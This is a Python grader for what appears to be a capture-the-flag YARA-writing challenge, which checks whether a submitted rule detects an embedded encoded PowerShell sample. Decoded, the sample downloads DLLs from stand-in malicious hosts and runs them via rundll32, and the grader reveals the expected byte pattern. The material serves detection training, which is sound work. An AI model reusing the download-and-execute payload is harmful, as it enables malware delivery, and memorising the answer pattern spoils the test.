import os
import sys
from pathlib import Path
import yara
from dotenv import load_dotenv

load_dotenv()

flag = os.getenv('FLAG')
argc = len(sys.argv)
if argc < 2:
    print("Usage: ./check_yara <rulefile>")
    exit()

rulefile = sys.argv[1]
if not Path(rulefile).exists():
    print("File not found")
    print("Usage: ./check_yara <rulefile>")
    exit()

with open(rulefile, 'r') as f:
    ruleText = f.read()

try:
    rules = yara.compile(filepath=rulefile)
except yara.SyntaxError as e:
    print(str(e))
    exit()
except:
    print("yara compile error")
    exit()

data="""
powershell -enc PAAjACAAWQBvAHUAcgAgAFAAQwAgAGkAcwAgAE0AaQBuAGUAIQAhACEAIQAhACEAIABDAHIAZQBhAHQAZQBkACAAYgB5ACAAWgBuAFYAdABNAFcAZwB4AGQARwA4AD0AIAAjAD4ADQAKACQAcwB0AHIAcwAgAD0AIAAiAGgAdAB0AHAAcwA6AC8ALwBpAG4AZgBlAGMAdABlAGQALgBlAHYAaQBsAC4AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAC8AdwBvAHIAZABwAHIAZQBzAHMALwBqAHAAMgBjAEwAbABxADQAWAB3ACIALAAgACIAaAB0AHQAcABzADoALwAvAGkAbgBmAGUAYwB0AGUAZAAuAHEAZwByAGMAaQA3ADQATgBnAFcALgB4AHkAegAvADMAWABHAEoAMAB1AGsAawBCAFQAIgAsACAAIgBoAHQAdABwAHMAOgAvAC8AaQBuAGYAZQBjAHQAZQBkAC4AZwBvAG8AbwBvAGcAbABlAC4AYwBvAG0ALwBzAGgAbwBwAC8AZgBEAHYARgBQAEwAQgBCAGUAVAAiAA0ACgANAAoAZgBvAHIAZQBhAGMAaAAgACgAJABzAHQAIABpAG4AIAAkAHMAdAByAHMAKQB7AA0ACgAgACAAIAAgACQAcgAxACAAPQAgAGcAZQB0AC0AcgBhAG4AZABvAG0AIAANAAoAIAAgACAAIAAkAHIAMgAgAD0AIABnAGUAdAAtAHIAYQBuAGQAbwBtAA0ACgANAAoAIAAgACAAIAAkAHQAcAB0AGgAIAA9ACAAIgBDADoAXABcAEkAbgBmAGUAYwB0AGUAZABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABcACIAIAArACAAJAByADEAIAArACAAIgAuAGQAbABsACIADQAKACAAIAAgACAAaQBuAGYAZQBjAHQAZQBkAC0AaQBuAHYAbwBrAGUALQB3AGUAYgByAGUAcQB1AGUAcwB0ACAALQB1AHIAaQAgACQAcwB0ACAALQBvAHUAdABmAGkAbABlACAAJAB0AHAAdABoAA0ACgAgACAAIAAgAGkAZgAgACgAdABlAHMAdAAtAHAAYQB0AGgAIAAkAHQAcAB0AGgAKQAgAHsADQAKACAAIAAgACAAIAAgACAAIAAkAGYAcAAgAD0AIAAiAEMAOgBcAFwASQBuAGYAZQBjAHQAZQBkAC0AVwBpAG4AZABvAHcAcwBcAFwAUwB5AHMAVwBvAHcANgA0AFwAXAByAHUAbgBkAGwAbAAzADIALgBlAHgAZQAiAA0ACgAgACAAIAAgACAAIAAgACAAJABhACAAPQAgACQAdABwAHQAaAAgACsAIAAiACwAZgAiACAAKwAgACQAcgAyAA0ACgAgACAAIAAgACAAIAAgACAAcwB0AGEAcgB0AC0AcAByAG8AYwBlAHMAcwAgACIAQwA6AFwAXABJAG4AZgBlAGMAdABlAGQALQBXAGkAbgBkAG8AdwBzAFwAXABTAHkAcwBXAG8AdwA2ADQAXABcAHIAdQBuAGQAbABsADMAMgAuAGUAeABlACIAIAAtAGEAcgBnAHUAbQBlAG4AdABsAGkAcwB0ACAAJABhAA0ACgAgACAAIAAgACAAIAAgACAAYgByAGUAYQBrAA0ACgAgACAAIAAgAH0ADQAKAH0A
"""
matches_flag = rules.match(data = data)

if len(matches_flag) > 0:
    print('mathced rule:')
    print(matches_flag)
    print()
    if "base64" not in ruleText:
        print("Ops, It may detect another malware.\nThis malware seems to stupidly have the creator's name on it.")
        exit()
    else:
        if "\\x5a\\x00\\x6e\\x00\\x56\\x00\\x74\\x00\\x4d\\x00\\x57\\x00\\x67\\x00\\x78\\x00\\x64\\x00\\x47\\x00\\x38\\x00\\x3d\\x00" not in ruleText:
            print("Good job!")
            print("But it may lead to false positives of other malware.\nTry again!!!")
            exit()
        else:
            print('flag is ' + flag)
            print('Congratulations!')
else:
    print('No match')